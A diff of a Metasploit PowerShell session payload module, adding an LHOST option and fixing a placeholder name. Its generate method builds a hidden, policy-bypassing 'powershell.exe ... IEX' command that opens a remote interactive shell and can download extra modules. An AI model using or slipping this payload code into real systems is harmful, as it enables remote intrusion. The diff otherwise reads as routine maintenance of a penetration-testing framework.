@@ -15,8 +15,8 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Windows Interactive Powershell Session, Bind TCP',
-      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
+      'Name'          => 'Windows Interactive Powershell Session, Bins TCP',
+      'Description'   => 'Interacts with a powershell session on an established socket connection',
       'Author'        =>
         [
           'Ben Turner', # benpturner
@@ -47,6 +47,7 @@ module Metasploit3
 
   def generate
     lport = datastore['LPORT']
+    lhost = datastore['LHOST']
 
     template_path = File.join(
     Msf::Config.data_directory,
@@ -62,14 +63,15 @@ module Metasploit3
     if datastore['LOAD_MODULES']
       mods_array = datastore['LOAD_MODULES'].to_s.split(',')
       mods_array.collect(&:strip)
-      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
+      vprint_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
       mods_array.each {|m| vprint_good " #{m}"}
       mods = "\"#{mods_array.join("\",\n\"")}\""
       script_in << " -Download true\n"
     end
 
     script_in.gsub!('MODULES_REPLACE', mods)
-    script_in.gsub!('LPORTs_REPLACE', lport.to_s)
+    script_in.gsub!('LPORT_REPLACE', lport.to_s)
+    script_in.gsub!('LHOST_REPLACE', lhost.to_s)
 
     script = Rex::Powershell::Command.compress_script(script_in)
     "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
